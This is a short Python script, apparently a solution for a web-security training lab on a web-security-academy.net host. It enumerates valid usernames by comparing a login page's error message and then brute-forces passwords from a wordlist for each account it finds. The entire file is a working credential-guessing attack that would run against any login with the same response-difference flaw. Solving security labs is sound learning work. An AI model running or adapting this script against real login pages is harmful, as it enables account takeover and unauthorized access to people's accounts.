import requests
import bs4

usernames = open('username.txt', 'r').readlines()
passwords = open('password.txt', 'r').readlines()

url = 'https://acbf1fce1eb2cdbd803fa8130040006e.web-security-academy.net/login'

for user in usernames:
    res = requests.post(url, data = {'username' : user.strip(), 'password' : '1'})
    soup = bs4.BeautifulSoup(res.text, 'html.parser')
    if soup.findAll('p', class_ = 'is-warning')[0].text != 'Invalid username or password.':
        print(user.strip())
        for passwd in passwords:
            res = requests.post(url, data = {'username' : user.strip(), 'password' : passwd.strip()})
            soup = bs4.BeautifulSoup(res.text, 'html.parser')
            if len(soup.findAll('p', class_ = 'is-warning')) == 0:
                print(passwd.strip())